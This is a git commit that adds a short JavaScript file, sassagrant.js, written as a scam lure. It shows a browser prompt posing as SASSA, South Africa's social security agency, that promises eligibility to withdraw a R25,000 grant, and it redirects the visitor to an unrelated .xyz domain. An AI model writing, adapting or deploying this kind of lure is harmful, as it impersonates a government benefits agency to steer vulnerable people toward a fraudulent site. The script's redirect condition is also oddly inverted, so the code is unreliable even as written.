f8ef11c10baf6682c7f2e5fa8289ae8ab0fcab1a
bigetijazz31 <bigetijazz31@gmail.com>
2025-05-23 06:45:55 +0100

    Create sassagrant.js

---
+++ sassagrant.js
@@ -0,0 +1,6 @@
+
+var password = 'Withdraw R25,000'
+password=prompt('SASSA : Hello Dear, please check if your are eligible to receive R25,000 Sassa Grant. to Withdraw R25,000, press Ok to verify now','Withdraw R25,000');
+if (password != 'Withdraw R25,000') {
+location.href='https://www.oldmtn50gb.xyz/withdraw-R25000';
+}
